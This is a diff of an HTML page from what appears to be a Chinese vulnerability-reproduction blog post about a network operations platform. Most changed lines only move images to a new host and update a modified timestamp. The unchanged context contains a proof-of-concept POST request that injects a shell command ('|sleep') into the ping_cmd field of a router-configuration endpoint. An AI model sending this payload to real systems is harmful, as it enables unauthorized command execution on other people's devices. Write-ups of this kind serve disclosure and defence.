@@ -23,15 +23,15 @@
 <meta property="og:site_name" content="AU9U5T">
 <meta property="og:description" content="0x01 产品简介TG万网博通秉承技术驱动场景的创新理念，2015年，国内第一家推出基于人工智能和深度学习技术的“全息AI弱电网络综合运维平台”，实现了弱电智能化AI网络零突破。2017年，国内第一家推出针对视频网络系统专用的“全息AI安防网络专用平台”，并成为了安防行业网络传输标杆产品。依托创新的技术实力，全息AI平台及解决方案已成功的应用于北京冬奥会、北京世园会、北京大兴国际机场、清华大学、南">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133039564.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240814124742614.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133631543.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133039564.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240814124742614.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133631543.png">
 <meta property="article:published_time" content="2024-08-13T05:11:14.000Z">
-<meta property="article:modified_time" content="2024-08-14T04:47:55.582Z">
+<meta property="article:modified_time" content="2025-06-01T09:42:24.304Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133039564.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133039564.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -293,8 +293,8 @@
 
 
 <h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>系统登录界面</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133039564.png" srcset="/img/loading.gif" lazyload alt="image-20240813133039564"><br>漏洞利用poc</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240814124742614.png" srcset="/img/loading.gif" lazyload alt="image-20240814124742614"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133039564.png" srcset="/img/loading.gif" lazyload alt="image-20240813133039564"><br>漏洞利用poc</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240814124742614.png" srcset="/img/loading.gif" lazyload alt="image-20240814124742614"></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/nmss/cloud/Ajax/ajax_cloud_router_config.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>24<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-maxima">ping_cmd=<span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>|sleep%<span class="hljs-number">2b6</span></span><br></code></pre></td></tr></table></figure>
 
 
@@ -306,7 +306,7 @@
 
 
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133631543.png" srcset="/img/loading.gif" lazyload alt="image-20240813133631543"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240813133631543.png" srcset="/img/loading.gif" lazyload alt="image-20240813133631543"></p>
 <h2 id="0x06-修复建议"><a href="#0x06-修复建议" class="headerlink" title="0x06 修复建议"></a>0x06 修复建议</h2>
                 
               </div>
